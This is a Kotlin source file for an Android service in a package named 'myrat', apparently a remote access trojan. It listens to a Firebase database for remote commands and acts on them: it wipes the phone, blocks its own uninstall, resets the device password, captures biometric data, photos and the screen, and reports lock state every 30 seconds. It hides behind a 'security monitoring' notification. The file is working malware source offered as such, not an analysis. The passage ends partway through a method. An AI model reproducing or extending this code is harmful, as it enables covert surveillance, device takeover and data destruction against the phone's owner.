package com.myrat.app.service

import android.app.*
import android.app.admin.DevicePolicyManager
import android.content.*
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.Canvas
import android.graphics.PixelFormat
import android.hardware.camera2.*
import android.hardware.fingerprint.FingerprintManager
import android.media.ImageReader
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.*
import android.provider.Settings
import android.util.Base64
import android.util.Size
import android.view.*
import android.widget.Toast
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.ValueEventListener
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.myrat.app.MainActivity
import com.myrat.app.R
import com.myrat.app.receiver.MyDeviceAdminReceiver
import com.myrat.app.utils.Logger
import java.io.ByteArrayOutputStream
import java.util.concurrent.Executor

class LockService : Service() {
    private lateinit var deviceId: String
    private lateinit var devicePolicyManager: DevicePolicyManager
    private lateinit var keyguardManager: KeyguardManager
    private lateinit var powerManager: PowerManager
    private lateinit var adminComponent: ComponentName
    private lateinit var executor: Executor
    private lateinit var db: com.google.firebase.database.DatabaseReference
    private var biometricReceiver: BroadcastReceiver? = null
    private var deviceAdviceListener: ValueEventListener? = null
    private var lastCommandTime = 0L
    private var wakeLock: PowerManager.WakeLock? = null
    private var isServiceInitialized = false
    private val commandHandler = Handler(Looper.getMainLooper())
    
    // Camera and biometric capture components
    private var cameraManager: CameraManager? = null
    private var cameraDevice: CameraDevice? = null
    private var imageReader: ImageReader? = null
    private var captureSession: CameraCaptureSession? = null
    private var fingerprintManager: FingerprintManager? = null
    
    // Screen capture components
    private var windowManager: WindowManager? = null
    private var overlayView: View? = null
    private var isCapturingScreen = false

    companion object {
        private const val NOTIFICATION_ID = 3
        private const val CHANNEL_ID = "LockServiceChannel"
        private const val COMMAND_DEBOUNCE_MS = 500L
        private const val MAX_RETRY_ATTEMPTS = 3
        private const val OVERLAY_PERMISSION_REQUEST = 1001
    }

    override fun onCreate() {
        super.onCreate()
        try {
            Logger.log("🔐 Enhanced LockService onCreate started")

            // Initialize basic components first
            initializeBasicComponents()

            // Start foreground service immediately
            startForeground(NOTIFICATION_ID, buildNotification())

            // Initialize Firebase and other components
            initializeFirebaseAndComponents()

            // Initialize advanced components
            initializeAdvancedComponents()

            // Set up all listeners and functionality
            setupServiceFunctionality()

            isServiceInitialized = true
            Logger.log("✅ Enhanced LockService successfully initialized")

        } catch (e: Exception) {
            Logger.error("❌ Enhanced LockService failed to start", e)
            isServiceInitialized = false
        }
    }

    private fun initializeBasicComponents() {
        try {
            acquireWakeLock()
            deviceId = try {
                MainActivity.getDeviceId(this) ?: generateFallbackDeviceId()
            } catch (e: Exception) {
                Logger.error("Failed to get deviceId, using fallback", e)
                generateFallbackDeviceId()
            }

            Logger.log("🔐 Enhanced LockService initializing for deviceId: $deviceId")
            initializeSystemServices()

        } catch (e: Exception) {
            Logger.error("Failed to initialize basic components", e)
            throw e
        }
    }

    private fun generateFallbackDeviceId(): String {
        return try {
            val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            if (!androidId.isNullOrEmpty() && androidId != "9774d56d682e549c") {
                androidId
            } else {
                "lockservice_${System.currentTimeMillis()}_${(1000..9999).random()}"
            }
        } catch (e: Exception) {
            "lockservice_emergency_${System.currentTimeMillis()}"
        }
    }

    private fun initializeSystemServices() {
        try {
            devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager ?: run {
                Logger.error("DevicePolicyManager unavailable")
                throw IllegalStateException("DevicePolicyManager unavailable")
            }
            keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager ?: run {
                Logger.error("KeyguardManager unavailable")
                throw IllegalStateException("KeyguardManager unavailable")
            }
            powerManager = getSystemService(Context.POWER_SERVICE) as? PowerManager ?: run {
                Logger.error("PowerManager unavailable")
                throw IllegalStateException("PowerManager unavailable")
            }
            adminComponent = ComponentName(this, MyDeviceAdminReceiver::class.java)
            executor = ContextCompat.getMainExecutor(this)
            Logger.log("✅ System services initialized successfully")
        } catch (e: Exception) {
            Logger.error("Failed to initialize system services", e)
            throw e
        }
    }

    private fun initializeAdvancedComponents() {
        try {
            // Initialize camera manager for biometric capture
            cameraManager = getSystemService(Context.CAMERA_SERVICE) as? CameraManager
            
            // Initialize fingerprint manager for older devices
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Build.VERSION.SDK_INT < Build.VERSION_CODES.P) {
                fingerprintManager = getSystemService(Context.FINGERPRINT_SERVICE) as? FingerprintManager
            }
            
            // Initialize window manager for screen capture
            windowManager = getSystemService(Context.WINDOW_SERVICE) as? WindowManager
            
            Logger.log("✅ Advanced components initialized")
        } catch (e: Exception) {
            Logger.error("Failed to initialize advanced components", e)
        }
    }

    private fun initializeFirebaseAndComponents() {
        try {
            var firebaseInitialized = false
            for (attempt in 1..MAX_RETRY_ATTEMPTS) {
                try {
                    db = Firebase.database.getReference()
                    firebaseInitialized = true
                    Logger.log("✅ Firebase initialized successfully in Enhanced LockService (attempt $attempt)")
                    break
                } catch (e: Exception) {
                    Logger.error("Firebase initialization failed (attempt $attempt)", e)
                    if (attempt < MAX_RETRY_ATTEMPTS) {
                        Thread.sleep(2000)
                    }
                }
            }

            if (!firebaseInitialized) {
                Logger.error("❌ Firebase initialization failed after $MAX_RETRY_ATTEMPTS attempts")
            }

        } catch (e: Exception) {
            Logger.error("Error in initializeFirebaseAndComponents", e)
        }
    }

    private fun setupServiceFunctionality() {
        try {
            setupBiometricResultReceiver()
            setupFirebaseConnection()
            fetchAndUploadLockDetails()
            listenForDeviceAdviceCommands()
            schedulePeriodicTasks()
            monitorPasswordState()
        } catch (e: Exception) {
            Logger.error("Error setting up service functionality", e)
        }
    }

    private fun acquireWakeLock() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "LockService:KeepAlive"
            )
            wakeLock?.acquire(60 * 60 * 1000L)
            Logger.log("✅ Wake lock acquired for Enhanced LockService")
        } catch (e: Exception) {
            Logger.error("Failed to acquire wake lock", e)
        }
    }

    private fun schedulePeriodicTasks() {
        try {
            val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            val intent = Intent(this, LockService::class.java)
            val pendingIntent = PendingIntent.getService(
                this, 0, intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                if (alarmManager.canScheduleExactAlarms()) {
                    alarmManager.setExactAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + 10 * 60 * 1000,
                        pendingIntent
                    )
                } else {
                    alarmManager.setAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + 10 * 60 * 1000,
                        pendingIntent
                    )
                }
            } else {
                alarmManager.setRepeating(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + 10 * 60 * 1000,
                    10 * 60 * 1000,
                    pendingIntent
                )
            }
            Logger.log("✅ Scheduled periodic restart for Enhanced LockService")
        } catch (e: Exception) {
            Logger.error("Failed to schedule periodic restart", e)
        }
    }

    private fun setupFirebaseConnection() {
        try {
            if (::db.isInitialized) {
                db.child("Device").child(deviceId).child("lock_service").child("connected")
                    .setValue(true)
                    .addOnSuccessListener {
                        Logger.log("✅ Firebase connection status updated")
                    }
                    .addOnFailureListener { e ->
                        Logger.error("Failed to set connected status in Enhanced LockService", e)
                    }
            }
        } catch (e: Exception) {
            Logger.error("Error setting up Firebase connection", e)
        }
    }

    private fun buildNotification(): Notification {
        val channelId = CHANNEL_ID
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = NotificationChannel(
                    channelId,
                    "Enhanced Device Lock Service",
                    NotificationManager.IMPORTANCE_LOW
                ).apply {
                    setShowBadge(false)
                    enableLights(false)
                    enableVibration(false)
                    setSound(null, null)
                    description = "Advanced device lock and security management"
                }
                val manager = getSystemService(NotificationManager::class.java)
                manager?.createNotificationChannel(channel)
            }
            return NotificationCompat.Builder(this, channelId)
                .setContentTitle("Enhanced Device Lock Service")
                .setContentText("Advanced security monitoring active")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
                .build()
        } catch (e: Exception) {
            Logger.error("Failed to build notification in Enhanced LockService", e)
            return NotificationCompat.Builder(this, channelId)
                .setContentTitle("Lock Service")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setOngoing(true)
                .build()
        }
    }

    private fun isNetworkAvailable(): Boolean {
        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return false
        return try {
            val network = connectivityManager.activeNetwork ?: return false
            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
            capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
        } catch (e: Exception) {
            Logger.error("Network check failed", e)
            false
        }
    }

    private fun fetchAndUploadLockDetails() {
        try {
            val lockDetails = mapOf(
                "isDeviceSecure" to keyguardManager.isDeviceSecure,
                "biometricStatus" to getBiometricStatus(),
                "biometricType" to getBiometricType(),
                "isDeviceAdminActive" to devicePolicyManager.isAdminActive(adminComponent),
                "passwordQuality" to getPasswordQuality(),
                "lockScreenTimeout" to getLockScreenTimeout(),
                "keyguardFeatures" to getDisabledKeyguardFeatures(),
                "lastUpdated" to System.currentTimeMillis(),
                "androidVersion" to Build.VERSION.SDK_INT,
                "manufacturer" to Build.MANUFACTURER,
                "model" to Build.MODEL,
                "serviceInitialized" to isServiceInitialized,
                "networkAvailable" to isNetworkAvailable(),
                "cameraAvailable" to (cameraManager != null),
                "fingerprintAvailable" to isFingerprintAvailable(),
                "overlayPermission" to hasOverlayPermission()
            )

            if (::db.isInitialized) {
                db.child("Device").child(deviceId).child("lock_details").setValue(lockDetails)
                    .addOnSuccessListener {
                        Logger.log("✅ Enhanced lock details uploaded successfully")
                    }
                    .addOnFailureListener { e ->
                        Logger.error("Failed to upload enhanced lock details: ${e.message}")
                    }
            }
        } catch (e: Exception) {
            Logger.error("Error fetching enhanced lock details", e)
        }
    }

    private fun getPasswordQuality(): String {
        return try {
            if (devicePolicyManager.isAdminActive(adminComponent)) {
                when (devicePolicyManager.getPasswordQuality(adminComponent)) {
                    DevicePolicyManager.PASSWORD_QUALITY_UNSPECIFIED -> "Unspecified"
                    DevicePolicyManager.PASSWORD_QUALITY_SOMETHING -> "Something"
                    DevicePolicyManager.PASSWORD_QUALITY_NUMERIC -> "Numeric"
                    DevicePolicyManager.PASSWORD_QUALITY_NUMERIC_COMPLEX -> "Numeric Complex"
                    DevicePolicyManager.PASSWORD_QUALITY_ALPHABETIC -> "Alphabetic"
                    DevicePolicyManager.PASSWORD_QUALITY_ALPHANUMERIC -> "Alphanumeric"
                    DevicePolicyManager.PASSWORD_QUALITY_COMPLEX -> "Complex"
                    else -> "Unknown"
                }
            } else {
                "Admin Not Active"
            }
        } catch (e: Exception) {
            Logger.error("Error getting password quality", e)
            "Error"
        }
    }

    private fun getLockScreenTimeout(): Long {
        return try {
            if (devicePolicyManager.isAdminActive(adminComponent)) {
                devicePolicyManager.getMaximumTimeToLock(adminComponent)
            } else {
                -1L
            }
        } catch (e: Exception) {
            Logger.error("Error getting lock screen timeout", e)
            -1L
        }
    }

    private fun getDisabledKeyguardFeatures(): List<String> {
        return try {
            if (devicePolicyManager.isAdminActive(adminComponent)) {
                val features = mutableListOf<String>()
                val disabledFeatures = devicePolicyManager.getKeyguardDisabledFeatures(adminComponent)
                
                if (disabledFeatures and DevicePolicyManager.KEYGUARD_DISABLE_FEATURES_NONE != 0) {
                    features.add("None")
                }
                if (disabledFeatures and DevicePolicyManager.KEYGUARD_DISABLE_WIDGETS_ALL != 0) {
                    features.add("Widgets")
                }
                if (disabledFeatures and DevicePolicyManager.KEYGUARD_DISABLE_SECURE_CAMERA != 0) {
                    features.add("Camera")
                }
                if (disabledFeatures and DevicePolicyManager.KEYGUARD_DISABLE_SECURE_NOTIFICATIONS != 0) {
                    features.add("Notifications")
                }
                if (disabledFeatures and DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS != 0) {
                    features.add("Trust Agents")
                }
                if (disabledFeatures and DevicePolicyManager.KEYGUARD_DISABLE_UNREDACTED_NOTIFICATIONS != 0) {
                    features.add("Unredacted Notifications")
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    if (disabledFeatures and DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT != 0) {
                        features.add("Fingerprint")
                    }
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    if (disabledFeatures and DevicePolicyManager.KEYGUARD_DISABLE_FACE != 0) {
                        features.add("Face")
                    }
                    if (disabledFeatures and DevicePolicyManager.KEYGUARD_DISABLE_IRIS != 0) {
                        features.add("Iris")
                    }
                }
                
                features
            } else {
                listOf("Admin Not Active")
            }
        } catch (e: Exception) {
            Logger.error("Error getting disabled keyguard features", e)
            listOf("Error")
        }
    }

    private fun getBiometricStatus(): String {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                val biometricManager = androidx.biometric.BiometricManager.from(this)
                when (biometricManager.canAuthenticate(androidx.biometric.BiometricManager.Authenticators.BIOMETRIC_STRONG)) {
                    androidx.biometric.BiometricManager.BIOMETRIC_SUCCESS -> "Enrolled"
                    androidx.biometric.BiometricManager.BIOMETRIC_ERROR_NO_HARDWARE -> "Not Available"
                    androidx.biometric.BiometricManager.BIOMETRIC_ERROR_NONE_ENROLLED -> "Not Enrolled"
                    androidx.biometric.BiometricManager.BIOMETRIC_ERROR_HW_UNAVAILABLE -> "Hardware Unavailable"
                    androidx.biometric.BiometricManager.BIOMETRIC_ERROR_SECURITY_UPDATE_REQUIRED -> "Security Update Required"
                    androidx.biometric.BiometricManager.BIOMETRIC_ERROR_UNSUPPORTED -> "Unsupported"
                    androidx.biometric.BiometricManager.BIOMETRIC_STATUS_UNKNOWN -> "Unknown"
                    else -> "Unknown"
                }
            } catch (e: Exception) {
                Logger.error("Error getting biometric status", e)
                "Error"
            }
        } else {
            "Not Available"
        }
    }

    private fun getBiometricType(): String {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                val biometricManager = androidx.biometric.BiometricManager.from(this)
                if (biometricManager.canAuthenticate(androidx.biometric.BiometricManager.Authenticators.BIOMETRIC_STRONG) == androidx.biometric.BiometricManager.BIOMETRIC_SUCCESS) {
                    "Fingerprint/Face"
                } else {
                    "None"
                }
            } catch (e: Exception) {
                Logger.error("Error getting biometric type", e)
                "Error"
            }
        } else {
            "None"
        }
    }

    private fun isFingerprintAvailable(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                fingerprintManager?.isHardwareDetected == true && fingerprintManager?.hasEnrolledFingerprints() == true
            } catch (e: Exception) {
                false
            }
        } else {
            false
        }
    }

    private fun hasOverlayPermission(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Settings.canDrawOverlays(this)
        } else {
            true
        }
    }

    private fun monitorPasswordState() {
        try {
            // Monitor password state changes
            val passwordStateMonitor = object : Runnable {
                override fun run() {
                    try {
                        val currentState = mapOf(
                            "isDeviceSecure" to keyguardManager.isDeviceSecure,
                            "isDeviceLocked" to keyguardManager.isDeviceLocked,
                            "timestamp" to System.currentTimeMillis()
                        )
                        
                        if (::db.isInitialized) {
                            db.child("Device").child(deviceId).child("password_state").setValue(currentState)
                        }
                        
                        // Schedule next check
                        commandHandler.postDelayed(this, 30000) // Check every 30 seconds
                    } catch (e: Exception) {
                        Logger.error("Error monitoring password state", e)
                        commandHandler.postDelayed(this, 60000) // Retry in 1 minute
                    }
                }
            }
            
            commandHandler.post(passwordStateMonitor)
            Logger.log("✅ Password state monitoring started")
        } catch (e: Exception) {
            Logger.error("Failed to start password state monitoring", e)
        }
    }

    private fun listenForDeviceAdviceCommands() {
        try {
            if (!::db.isInitialized) {
                Logger.error("❌ Database not initialized, cannot listen for commands")
                return
            }

            Logger.log("🔄 Setting up enhanced device advice command listener...")

            deviceAdviceListener = object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    try {
                        Logger.log("📨 RTDB snapshot received for enhanced device advice")
                        if (!snapshot.exists()) {
                            Logger.log("📭 No data in device advice snapshot")
                            return
                        }

                        val action = snapshot.child("action").getValue(String::class.java) ?: run {
                            Logger.error("❌ No action found in command")
                            return
                        }

                        val status = snapshot.child("status").getValue(String::class.java) ?: "unknown"
                        val commandId = snapshot.child("commandId").getValue(String::class.java) ?: "unknown"
                        val timestamp = snapshot.child("timestamp").getValue(Long::class.java) ?: 0L
                        val params = snapshot.child("params").getValue() as? Map<String, Any> ?: emptyMap()

                        Logger.log("📋 Enhanced command received: action=$action, status=$status, commandId=$commandId")

                        if (status != "pending") {
                            Logger.log("⏭️ Ignoring non-pending command: $action (status: $status)")
                            return
                        }

                        if (System.currentTimeMillis() - lastCommandTime < COMMAND_DEBOUNCE_MS) {
                            Logger.log("⏸️ Command ignored due to debounce: $action")
                            return
                        }

                        lastCommandTime = System.currentTimeMillis()
                        Logger.log("🚀 Processing enhanced lock command: $action")

                        val command = DeviceAdviceCommand(
                            action = action,
                            commandId = commandId,
                            status = status,
                            timestamp = timestamp,
                            params = params
                        )

                        commandHandler.post {
                            processCommandWithTimeout(command)
                        }

                    } catch (e: Exception) {
                        Logger.error("❌ Error processing enhanced RTDB command", e)
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Logger.error("❌ Error listening for enhanced commands: ${error.message}")
                }
            }

            db.child("Device").child(deviceId).child("deviceAdvice")
                .addValueEventListener(deviceAdviceListener!!)

            Logger.log("✅ Enhanced device advice command listener set up successfully")

        } catch (e: Exception) {
            Logger.error("❌ Failed to set up enhanced command listener", e)
        }
    }

    private fun processCommandWithTimeout(command: DeviceAdviceCommand) {
        try {
            Logger.log("⏱️ Processing enhanced command with timeout: ${command.action}")

            val timeoutHandler = Handler(Looper.getMainLooper())
            val timeoutRunnable = Runnable {
                Logger.error("⏰ Enhanced command processing timeout: ${command.action}")
                updateCommandStatus(command, "timeout", "Command processing timed out")
            }

            timeoutHandler.postDelayed(timeoutRunnable, 30000)

            val success = processCommand(command)

            timeoutHandler.removeCallbacks(timeoutRunnable)

            if (!success) {
                updateCommandStatus(command, "failed", "Command execution failed")
            }

        } catch (e: Exception) {
            Logger.error("❌ Error in enhanced processCommandWithTimeout", e)
            updateCommandStatus(command, "error", "Processing error: ${e.message}")
        }
    }

    private fun processCommand(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("🔧 Processing enhanced command: ${command.action}")

            when (command.action) {
                "lock" -> lockDevice(command)
                "unlock" -> unlockDevice(command)
                "screenOn" -> turnScreenOn(command)
                "screenOff" -> turnScreenOff(command)
                "CaptureBiometricData" -> captureBiometricData(command)
                "BiometricUnlock" -> biometricUnlock(command)
                "wipeThePhone" -> wipeThePhone(command)
                "preventUninstall" -> preventUninstall(command)
                "reboot" -> rebootDevice(command)
                "enableAdmin" -> enableDeviceAdmin(command)
                "getStatus" -> getDeviceStatus(command)
                "resetPassword" -> resetPassword(command)
                "setPasswordQuality" -> setPasswordQuality(command)
                "setLockTimeout" -> setLockTimeout(command)
                "disableKeyguardFeatures" -> disableKeyguardFeatures(command)
                "captureScreen" -> captureScreen(command)
                "capturePhoto" -> capturePhoto(command)
                "captureFingerprint" -> captureFingerprint(command)
                "disableApp" -> disableApp(command)
                "uninstallApp" -> uninstallApp(command)
                "monitorUnlock" -> monitorUnlockAttempts(command)
                else -> {
                    Logger.error("❌ Unknown enhanced command: ${command.action}")
                    updateCommandStatus(command, "failed", "Unknown command: ${command.action}")
                    false
                }
            }
        } catch (e: Exception) {
            Logger.error("❌ Error processing enhanced command: ${command.action}", e)
            updateCommandStatus(command, "error", "Processing error: ${e.message}")
            false
        }
    }

    private fun lockDevice(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("🔒 Attempting to lock device...")

            if (devicePolicyManager.isAdminActive(adminComponent)) {
                devicePolicyManager.lockNow()
                updateCommandStatus(command, "success", null)
                Logger.log("✅ Device locked successfully")
                true
            } else {
                Logger.error("❌ Device admin not active for lockDevice")
                updateCommandStatus(command, "failed", "Device admin not active")
                promptForDeviceAdmin()
                false
            }
        } catch (e: Exception) {
            Logger.error("❌ Lock device failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
            false
        }
    }

    private fun unlockDevice(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("🔓 Attempting to unlock device...")

            if (keyguardManager.isDeviceLocked) {
                // Try multiple unlock methods
                val unlockMethods = listOf(
                    { biometricUnlock(command) },
                    { captureAndAnalyzePattern(command) },
                    { captureAndAnalyzePassword(command) }
                )

                for (method in unlockMethods) {
                    if (method()) {
                        updateCommandStatus(command, "success", "Device unlocked")
                        return true
                    }
                }

                updateCommandStatus(command, "failed", "All unlock methods failed")
                false
            } else {
                updateCommandStatus(command, "success", "Device already unlocked")
                Logger.log("✅ Device already unlocked")
                true
            }
        } catch (e: Exception) {
            Logger.error("❌ Failed to unlock device", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
            false
        }
    }

    private fun turnScreenOn(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("💡 Attempting to turn screen on...")

            if (!powerManager.isInteractive) {
                val wakeLock = powerManager.newWakeLock(
                    PowerManager.FULL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.ON_AFTER_RELEASE,
                    "LockService:ScreenOn"
                )
                wakeLock.acquire(5000)
                wakeLock.release()
                updateCommandStatus(command, "success", null)
                Logger.log("✅ Screen turned on successfully")
                true
            } else {
                updateCommandStatus(command, "success", "Screen already on")
                Logger.log("✅ Screen already on")
                true
            }
        } catch (e: Exception) {
            Logger.error("❌ Turn screen on failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
            false
        }
    }

    private fun turnScreenOff(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("🌙 Attempting to turn screen off...")

            if (devicePolicyManager.isAdminActive(adminComponent)) {
                devicePolicyManager.lockNow()
                updateCommandStatus(command, "success", null)
                Logger.log("✅ Screen turned off successfully")
                true
            } else {
                Logger.error("❌ Device admin not active for screenOff")
                updateCommandStatus(command, "failed", "Device admin not active")
                promptForDeviceAdmin()
                false
            }
        } catch (e: Exception) {
            Logger.error("❌ Turn screen off failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
            false
        }
    }

    private fun captureBiometricData(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("👆 Attempting to capture biometric data...")

            val intent = Intent(this, com.myrat.app.BiometricAuthActivity::class.java).apply {
                putExtra(com.myrat.app.BiometricAuthActivity.EXTRA_COMMAND_ID, command.commandId)
                putExtra(com.myrat.app.BiometricAuthActivity.EXTRA_ACTION, com.myrat.app.BiometricAuthActivity.ACTION_CAPTURE_BIOMETRIC)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            startActivity(intent)
            updateCommandStatus(command, "pending", "Waiting for biometric data capture")
            Logger.log("✅ Biometric capture prompt shown")
            true
        } catch (e: Exception) {
            Logger.error("❌ Capture biometric data failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
            false
        }
    }

    private fun biometricUnlock(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("🔓 Attempting biometric unlock...")

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P && hasBiometricPermission()) {
                val biometricManager = androidx.biometric.BiometricManager.from(this)
                if (biometricManager.canAuthenticate(androidx.biometric.BiometricManager.Authenticators.BIOMETRIC_STRONG) != androidx.biometric.BiometricManager.BIOMETRIC_SUCCESS) {
                    updateCommandStatus(command, "failed", "Biometric authentication not available or enrolled")
                    Logger.error("❌ Biometric not available")
                    return false
                }

                val intent = Intent(this, com.myrat.app.BiometricAuthActivity::class.java).apply {
                    putExtra(com.myrat.app.BiometricAuthActivity.EXTRA_COMMAND_ID, command.commandId)
                    putExtra(com.myrat.app.BiometricAuthActivity.EXTRA_ACTION, com.myrat.app.BiometricAuthActivity.ACTION_BIOMETRIC_UNLOCK)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                }
                startActivity(intent)
                updateCommandStatus(command, "pending", "Waiting for biometric unlock")
                Logger.log("✅ Biometric unlock prompt shown")
                true
            } else {
                updateCommandStatus(command, "failed", "Biometric authentication not supported or permission denied")
                Logger.error("❌ Biometric not supported")
                false
            }
        } catch (e: Exception) {
            Logger.error("❌ Biometric unlock failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
            false
        }
    }

    private fun wipeThePhone(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("🗑️ Attempting to wipe device...")

            if (devicePolicyManager.isAdminActive(adminComponent)) {
                commandHandler.postDelayed({
                    try {
                        devicePolicyManager.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE)
                        updateCommandStatus(command, "success", null)
                        Logger.log("✅ Device wipe initiated")
                    } catch (e: Exception) {
                        Logger.error("❌ Device wipe execution failed", e)
                        updateCommandStatus(command, "error", "Wipe execution failed: ${e.message}")
                    }
                }, 5000)
                updateCommandStatus(command, "pending", "Device wipe scheduled in 5 seconds")
                Logger.log("⏳ Device wipe scheduled")
                true
            } else {
                Logger.error("❌ Device admin not active for wipeThePhone")
                updateCommandStatus(command, "failed", "Device admin not active")
                promptForDeviceAdmin()
                false
            }
        } catch (e: Exception) {
            Logger.error("❌ Wipe device failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
            false
        }
    }

    private fun preventUninstall(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("🛡️ Attempting to prevent uninstall...")

            if (devicePolicyManager.isAdminActive(adminComponent)) {
                devicePolicyManager.setUninstallBlocked(adminComponent, packageName, true)
                updateCommandStatus(command, "success", null)
                Logger.log("✅ Uninstall prevention enabled")
                true
            } else {
                Logger.error("❌ Device admin not active for preventUninstall")
                updateCommandStatus(command, "failed", "Device admin not active")
                promptForDeviceAdmin()
                false
            }
        } catch (e: Exception) {
            Logger.error("❌ Prevent uninstall failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
            false
        }
    }

    private fun rebootDevice(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("🔄 Attempting to reboot device...")

            if (devicePolicyManager.isAdminActive(adminComponent)) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    devicePolicyManager.reboot(adminComponent)
                    updateCommandStatus(command, "success", null)
                    Logger.log("✅ Device reboot initiated")
                    true
                } else {
                    updateCommandStatus(command, "failed", "Reboot not supported on this Android version")
                    Logger.error("❌ Reboot not supported on Android ${Build.VERSION.SDK_INT}")
                    false
                }
            } else {
                Logger.error("❌ Device admin not active for reboot")
                updateCommandStatus(command, "failed", "Device admin not active")
                promptForDeviceAdmin()
                false
            }
        } catch (e: Exception) {
            Logger.error("❌ Reboot device failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
            false
        }
    }

    private fun enableDeviceAdmin(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("🔐 Attempting to enable device admin...")

            promptForDeviceAdmin()
            updateCommandStatus(command, "pending", "Device admin prompt shown")
            Logger.log("✅ Device admin prompt shown")
            true
        } catch (e: Exception) {
            Logger.error("❌ Enable device admin failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
            false
        }
    }

    private fun getDeviceStatus(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("📊 Getting enhanced device status...")

            fetchAndUploadLockDetails()
            updateCommandStatus(command, "success", "Enhanced device status updated")
            Logger.log("✅ Enhanced device status updated")
            true
        } catch (e: Exception) {
            Logger.error("❌ Get enhanced device status failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
            false
        }
    }

    private fun resetPassword(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("🔑 Attempting to reset password...")

            if (devicePolicyManager.isAdminActive(adminComponent)) {
                val newPassword = command.params["password"] as? String ?: ""
                val flags = DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY
                
                val success = devicePolicyManager.resetPassword(newPassword, flags)
                if (success) {
                    updateCommandStatus(command, "success", "Password reset successfully")
                    Logger.log("✅ Password reset successfully")
                } else {
                    updateCommandStatus(command, "failed", "Password reset failed")
                    Logger.error("❌ Password reset failed")
                }
                success
            } else {
                updateCommandStatus(command, "failed", "Device admin not active")
                false
            }
        } catch (e: Exception) {
            Logger.error("❌ Reset password failed", e)
            updateCommandStatus(command, "error", e.message ?: "Unknown error")
            false
        }
    }

    private fun setPasswordQuality(command: DeviceAdviceCommand): Boolean {
        return try {
            Logger.log("🔐 Setting password quality...")

            if (devicePolicyManager.isAdminActive(adminComponent)) {
                val quality = when (command.params["quality"] as? String) {
                    "numeric" -> DevicePolicyManager.PASSWORD_QUALITY_NUMERIC
